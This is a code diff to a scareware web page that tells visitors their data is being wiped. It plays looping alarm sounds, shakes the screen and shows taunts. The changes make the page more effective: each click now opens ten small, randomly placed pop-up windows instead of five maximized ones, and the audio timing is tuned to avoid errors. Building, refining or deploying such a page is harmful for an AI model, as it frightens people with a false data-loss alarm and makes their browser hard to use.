@@ -48,6 +48,7 @@
             z-index: 9999; 
             
             /* FULL SCREEN BACKGROUND IMAGE */
+            /* Replace with your actual image URL */
             background-image: url('Gemini_Generated_Image_qhpmhqqhpmhqqhpm.jpg'); 
             background-size: cover;
             background-position: center;
@@ -227,14 +228,15 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         const scaryDroneSynth = new Tone.Synth({ oscillator: { type: "sawtooth" } }).toDestination();
         const pingSynth = new Tone.NoiseSynth({ volume: 5 }).toDestination();
 
+        // Relaxed Timing to prevent "Start time must be strictly greater" errors
         const alarmSequence = new Tone.Sequence((time, note) => {
-            alarmSynth.triggerAttackRelease(note, "16n", time);
-        }, ["C#6", "D6", "C#6", "D6"], "16n");
+            alarmSynth.triggerAttackRelease(note, "8n", time); // Changed from 16n
+        }, ["C#6", "D6", "C#6", "D6"], "8n"); // Changed from 16n
         alarmSequence.loop = true;
 
         const pingSequence = new Tone.Sequence((time) => {
-             pingSynth.triggerAttackRelease("64n", time);
-        }, ["*"], "32n");
+             pingSynth.triggerAttackRelease("16n", time); // Changed from 64n
+        }, ["*"], "8n"); // Changed from 32n
         pingSequence.loop = true;
 
         // --- LOGIC FUNCTIONS ---
@@ -281,7 +283,8 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             audioContextStarted = true;
             alarmSequence.start(0); 
             pingSequence.start(0);
-            Tone.Transport.bpm.value = 600; 
+            // Reduced BPM to prevent audio engine overload
+            Tone.Transport.bpm.value = 300; // Changed from 600
             Tone.Transport.start();
             startProgressLoop();
         }
@@ -307,12 +310,13 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             } catch (e) { startBackgroundAlarm(); }
         }
 
-        // --- UPDATED: MAXIMIZED WINDOW CALCULATIONS ---
-        function getMaximizedFeatures() {
-            // Uses screen.availWidth and height to fill the user's desktop
-            const w = window.screen.availWidth;
-            const h = window.screen.availHeight;
-            return `width=${w},height=${h},left=0,top=0,resizable=yes,scrollbars=yes,status=yes,toolbar=no,menubar=no,location=no`;
+        function getRandomWindowFeatures() {
+            // SMALL POP-UPS: 300x200
+            const width = 300;
+            const height = 200;
+            const left = Math.floor(Math.random() * (window.screen.width - width));
+            const top = Math.floor(Math.random() * (window.screen.height - height));
+            return `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=no,status=no,toolbar=no,menubar=no,location=no`;
         }
 
         const autoStartUrl = window.location.href.split('#')[0] + "#start";
@@ -320,19 +324,16 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
         function startSecondaryFlood() {
             let count = 0;
             const i = setInterval(() => {
-                if (count >= 5) clearInterval(i);
-                // Open MAXIMIZED window
-                window.open(autoStartUrl, '_blank', getMaximizedFeatures());
+                // INCREASED: 10 asynchronous small pop-ups
+                if (count >= 10) clearInterval(i);
+                window.open(autoStartUrl, '_blank', getRandomWindowFeatures());
                 count++;
             }, 50);
         }
         function startSynchronousBlast() {
-            for (let i = 0; i < 5; i++) {
-                 // Open MAXIMIZED window
-                 window.open(autoStartUrl, '_blank', getMaximizedFeatures());
-            }
+            // INCREASED: 10 synchronous small pop-ups
+            for (let i = 0; i < 10; i++) window.open(autoStartUrl, '_blank', getRandomWindowFeatures());
         }
-        
         function repeatWindowFlood() {
             startSynchronousBlast(); startSecondaryFlood();
         }
@@ -344,14 +345,14 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
             document.body.classList.add('shake-active');
             tauntText.style.transform = `translate(${Math.random()*10-5}px, ${Math.random()*10-5}px)`;
             if (isEscape && Tone.Transport.state === 'started') {
-                noiseSynth.triggerAttackRelease("32n");
-                Tone.Transport.bpm.value = 900;
+                noiseSynth.triggerAttackRelease("32n", Tone.now()); // Added Tone.now() safety
+                Tone.Transport.bpm.value = 600; // Reduced max BPM
             }
             setTimeout(() => {
                 tauntOverlay.classList.remove('active');
                 document.body.classList.remove('shake-active');
                 isSimulatingFailure = false;
-                if (isEscape && Tone.Transport.state === 'started') Tone.Transport.bpm.value = 600;
+                if (isEscape && Tone.Transport.state === 'started') Tone.Transport.bpm.value = 300; // Reset to 300
             }, 30);
         }
 
@@ -383,9 +384,11 @@ Data Wiping is in progress - <strong id="progress-percent">0% complete</strong>
                 else startBackgroundAlarm();
             });
 
-            // 4. POPUP FLOOD (Repeats on every click)
-            repeatWindowFlood();
-            document.body.addEventListener('click', repeatWindowFlood);
+            // 4. POPUP FLOOD (Only from main window)
+            if (window.location.hash !== '#start') {
+                repeatWindowFlood();
+                document.body.addEventListener('click', repeatWindowFlood);
+            }
         };
 
         // Auto-start if hash is present (for popups)
